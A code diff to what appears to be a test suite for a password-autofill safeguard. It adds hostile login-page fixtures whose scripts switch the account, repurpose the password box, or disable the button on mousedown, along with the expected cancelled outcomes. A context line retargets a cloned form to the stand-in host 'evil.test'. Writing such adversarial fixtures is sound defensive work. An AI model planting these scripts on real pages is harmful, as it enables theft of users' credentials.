@@ -90,6 +90,20 @@ PAGES = {
     + '<script>document.querySelector("button").addEventListener("mouseover", () => {'
     " const f = document.forms[0]; const copy = f.cloneNode(true);"
     ' copy.action = "https://evil.test/clone"; f.replaceWith(copy); })</script>',
+    # the press itself switches the account and submits (before any click): cancelled
+    "/login/press": FORM.format(
+        "<input type=hidden name=username id=h><input name=email><input type=password name=p>"
+    )
+    + '<script>document.querySelector("button").addEventListener("mousedown", () => {'
+    ' h.value = "bob@corp.test"; document.forms[0].requestSubmit(); })</script>',
+    # the box turns into a new-password box just before the click: cancelled
+    "/login/repurpose": FORM.format("<input name=username><input type=password name=p id=p>")
+    + '<script>document.querySelector("button").addEventListener("mousedown",'
+    ' () => { p.autocomplete = "new-password"; })</script>',
+    # the button disables itself on the press, so no click arrives: emptied, not sent
+    "/login/swallow": FORM.format("<input name=username><input type=password name=p>")
+    + '<script>const b = document.querySelector("button");'
+    ' b.addEventListener("mousedown", () => { b.disabled = true; })</script>',
     # a username step whose destination moves just before the click: cancelled, not counted
     "/login/userswap": '<form method=post action="/ok"><input name=username><button>Go</button>'
     "</form><script>document.querySelector('button').addEventListener('mousedown',"
@@ -117,6 +131,9 @@ EXPECTED = {
     "/login/latecode": "password",
     "/login/clone": "password",
     "/login/userswap": "changed",
+    "/login/press": "password",
+    "/login/repurpose": "password",
+    "/login/swallow": "password",
 }
 
 
@@ -184,6 +201,9 @@ UNSENT = (
     "/login/picker",
     "/login/latecode",
     "/login/clone",
+    "/login/press",
+    "/login/repurpose",
+    "/login/swallow",
 )
 
 
